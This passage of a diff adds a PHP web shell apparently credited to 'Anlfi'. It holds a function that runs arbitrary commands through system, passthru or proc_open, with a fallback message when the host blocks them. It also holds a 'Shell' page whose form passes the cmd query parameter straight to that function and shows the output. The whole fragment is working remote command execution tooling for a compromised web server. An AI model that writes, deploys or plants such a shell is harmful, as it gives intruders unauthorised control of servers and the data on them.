+        system($command);
+        $output = ob_get_contents();    // Get the ouput 
+        ob_end_clean();                 // Stop output buffering
+    }
+    
+    else if(function_exists('passthru'))
+    {
+        ob_start(); //start output buffering
+        passthru($command);
+        $output = ob_get_contents();    // Get the ouput 
+        ob_end_clean();                 // Stop output buffering            
+    }
+    
+    else if(function_exists('proc_open'))
+    {
+        $descriptorspec = array(
+                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+                );
+        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
+        if(is_resource($handle))
+        {
+            if(function_exists('fread') && function_exists('feof'))
+            {
+                while(!feof($pipes[1]))
+                {
+                    $output .= fread($pipes[1], 512);
+                }
+            }
+            else if(function_exists('fgets') && function_exists('feof'))
+            {
+                while(!feof($pipes[1]))
+                {
+                    $output .= fgets($pipes[1],512);
+                }
+            }
+        }
+        pclose($handle);
+    }
+    else
+    {
+        $output = "They have their Security there! :( ";
+    }
+    
+    return(htmlspecialchars($output));
+    
+}
+function magicQuote($text)
+{
+    if (!get_magic_quotes_gpc())
+    {
+        return $text;
+    }
+    return stripslashes($text);
+}
+//------------------------------------------------------------------------------------------------
+
+
+?>
+</div>
+<div class="nav">
+<ul>
+    <li><a href="<?php echo $self.'?shell';?>">Shell</a></li>
+    <?php if($lock == 'on')
+    {
+    ?>
+        <li><a href="<?php echo $self.'?logout'?>">I m Out!</a></li>
+    <?php
+    }
+    ?>
+</ul>
+</div>
+/////////by:Anlfi//////////
+<?php
+//-------------------------------- Check what he wants -------------------------------------------
+
+// Shell
+
+if(isset($_GET['shell']))
+{
+    if(!isset($_GET['cmd']) || $_GET['cmd'] == '')
+    {
+        $result = "";    
+    }
+    else
+    {
+        $result=exec_all($_GET['cmd']);
+    }
+    ?>
+    <textarea class="cmd" cols="100" rows="20"><?php echo $result;?></textarea>
+    <form action="<?php echo $self;?>" method="GET">
+    <!-- For Shell -->
+    <input name="shell" type="hidden" />
+    <!-- For CMD -->
+    <input name="cmd" class="cmd" />
+    <input name="submit" value="Run!" class="own" type="submit" />
+    </form>
+    <?php
+    }
+}
+
+
+?>
